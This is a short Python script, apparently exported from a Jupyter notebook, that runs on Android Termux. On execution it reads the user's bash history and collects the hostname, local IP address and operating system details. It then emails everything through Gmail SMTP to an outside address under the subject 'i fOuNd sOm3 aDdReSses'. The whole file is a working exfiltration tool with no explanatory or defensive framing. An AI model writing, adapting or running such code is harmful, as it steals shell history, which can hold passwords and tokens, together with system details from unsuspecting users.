#!/usr/bin/env python
# coding: utf-8

# In[ ]:
import socket
import os
import smtplib
import email.message
import time
from datetime import time
from datetime import datetime
import platform
import os
osname = platform.system()
sysversion = platform.release()
look = open("/data/data/com.termux/files/home/.bash_history", "r")
lash = look.read()
def get_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        try:
            # doesn't even have to be reachable
            s.connect(('10.254.254.254', 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

def enviar_email():  
    ip = get_ip()
    hostname = socket.gethostname()
    data_e_hora_atuais = datetime.now()
    date = data_e_hora_atuais.strftime('%d/%m/%Y %H:%M')
    corpo_email = (f"""
    <b>AN ACTIVATION WAS BEEN REPORTED</b>
    <br></br>
    <p>HostName: {hostname}</p>
    <p>IP Address: {ip}</p>
    <p>Time: {date}</p>
    <p>Operational System: {osname}</p>
    <p>Ver. Of Operational System: {sysversion}</p>
    <p>Bash History: {lash}</p>
    """
    )
    msg = email.message.Message()
    msg['Subject'] = "i fOuNd sOm3 aDdReSses"
    msg['From'] = 'kakkskskskssjak@gmail.com'
    msg['To'] = 'j3wh6dpmzbcntct@gmail.com'
    password = ' ' 
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(corpo_email )

    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))


# In[ ]:

enviar_email()
